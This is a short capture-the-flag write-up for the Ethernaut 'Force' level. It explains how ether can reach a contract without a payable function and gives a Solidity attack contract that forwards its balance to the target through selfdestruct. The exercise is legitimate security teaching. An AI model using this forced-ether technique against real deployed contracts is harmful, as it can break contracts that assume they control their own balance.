# Day 7 - Force send ether

## selfdestruct

`selfdestruct` is currently 1 of 3 methods for your contract to receive ether

- Method 1 — via payable functions

- Method 2 — receiving mining reward: contract addresses can be designated as the recipients of mining block rewards

- Method 3 — from a destroyed contract: selfdestruct lets you designate a backup address to receive the remaining ethers from the contract you are destroying.

## Solution

```js
pragma solidity ^0.6.0;

contract AttackForce {
    address payable forwardAddress;

    // set ethernaut contract address as forward address
    constructor(address payable _forwardAddress) public payable {
        forwardAddress = _forwardAddress;
    }

    function collect() public payable returns(uint256) {
        return address(this).balance;
    }

    function selfDestruct() public {
        selfdestruct(forwardAddress);
    }
}
```

## [Reference](https://medium.com/coinmonks/ethernaut-lvl-7-walkthrough-how-to-selfdestruct-and-create-an-ether-blackhole-eb5bb72d2c57)
